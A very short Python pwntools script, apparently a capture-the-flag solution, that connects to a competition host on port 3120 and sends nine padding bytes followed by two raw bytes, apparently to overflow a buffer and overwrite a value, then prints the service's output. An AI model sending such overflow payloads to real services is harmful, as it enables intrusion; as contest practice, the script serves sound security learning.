from pwn import *

p = remote("host.cg21.metaproblems.com", 3120)
p.send(b'V'*9 + b'\x12\x4f')
p.stream()
